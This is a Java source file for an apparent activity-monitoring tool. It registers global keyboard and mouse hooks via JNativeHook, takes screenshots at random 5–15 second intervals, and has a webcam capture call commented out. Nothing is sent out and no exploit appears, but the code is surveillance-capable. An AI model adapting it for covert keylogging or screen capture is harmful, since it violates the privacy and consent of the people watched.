package flashlite;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;


public class Main implements Runnable  {
	private static double minInterval = 5000;//
	private static double maxInterval = 15000;
	private static double timeToTakeScreenShot;
	//private static 
	private static boolean flag = false;
	private static int maxNumOfScreenShots = 3;

	public static void main(String[] args) {
			new AppTray();
		int count = 0;
		
		try {
			System.out.println("Testinpt");
			GlobalScreen.registerNativeHook();
			
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		inputTracker tracker = new inputTracker();
		
		 GlobalScreen.getInstance().addNativeKeyListener(tracker);
		 GlobalScreen.getInstance().addNativeMouseListener(tracker);
		 GlobalScreen.getInstance().addNativeMouseMotionListener(tracker);
		
		
		
		do{
			if(flag){
				timeToTakeScreenShot = maxInterval;
				
			}
			else{
			timeToTakeScreenShot = Math.random()*(maxInterval-minInterval)+minInterval;
			//double between 5 and 15
			}
			try {
				Thread.sleep((long) timeToTakeScreenShot);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			ScreenShot.takeScreenShot();
			//WebcamPhoto.takeWebCamPhoto();
			count++;
		}while(count < maxNumOfScreenShots);

	}

	@Override
	public void run() {
		// TODO Auto-generated method stub
		
	}

}
